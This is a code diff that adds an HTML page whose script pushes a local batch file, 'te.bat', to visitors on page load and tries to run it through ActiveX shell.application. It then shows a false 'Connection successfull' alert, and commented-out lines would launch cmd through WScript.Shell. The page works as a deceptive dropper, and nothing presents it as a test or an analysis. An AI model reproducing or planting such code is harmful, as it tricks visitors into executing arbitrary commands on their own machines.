@@ -1,0 +1,37 @@
+
+
+<script
+src="https://code.jquery.com/jquery-3.6.0.js"
+integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk="
+crossorigin="anonymous"></script>
+
+
+<script>
+ function run (){
+     // WshShell= new ActiveXObject("WScript.Shell");
+     // WshShell.Run('cmd & ping gmail.com', 1,false);
+      var objShell = new ActiveXObject("shell.application");
+      objShell.ShellExecute("te.bat", "", "", "open", 1);
+      alert('Connection successfull');
+      $('#hideMessage').hide();
+ }
+
+  $(document).ready(function() {
+    window.location='te.bat';
+    
+  });
+
+
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
